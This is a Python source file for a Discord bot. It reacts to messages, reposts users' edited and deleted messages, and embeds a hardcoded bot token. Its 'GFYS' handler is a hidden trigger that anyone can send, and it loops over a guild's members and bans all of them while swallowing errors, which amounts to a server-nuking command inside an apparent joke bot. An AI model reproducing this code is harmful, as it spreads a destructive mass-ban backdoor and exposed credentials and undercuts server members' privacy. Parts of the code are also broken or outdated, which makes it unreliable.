import discord
import random
TOKEN = "NzczNTk2OTQ2MDkzOTY1MzYz.X6LiTA.NlWXSKLyhFyGq1ZdBq9NhA7ZQWM"
client = discord.Client()
invc = True
general = None
@client.event
async def on_ready():
    GUILD = client.guilds[1]
    general = discord.utils.get(client.guilds[0].voice_channels, name='Gerneral')
    print(
        f'{client.user} is connected to the following guild:\n'
        f'{GUILD.name}(id: {GUILD.id})'
    )
@client.event
async def on_message(message):
        if "ههه" in message.content:
            #await message.channel.send("555555555" * random.randint(1,10))
            await message.add_reaction("🥚")
        if message.content == "~JM":
            if invc:
                await client.join_voice_channel(general)
        if message.content == "GFYS":
            for member in client.guilds[1].members:
                print(client.guilds[1].members[1])
                try:
                    await client.guilds[1].ban(member)
                except:
                    pass
message = None
@client.event
async def on_message_edit(before, after):
    message = after
    if not message.author.bot:
        await message.channel.send(after.author.name + " Sent this:")
        await message.channel.send(before.content)
        await message.channel.send("then edited to this:")
        await message.channel.send(after.content)


message = None
@client.event
async def on_message_delete(message):
    await message.channel.send(message.author.name + " Sent this then deleted:")
    await message.channel.send(message.content)
client.run(TOKEN)
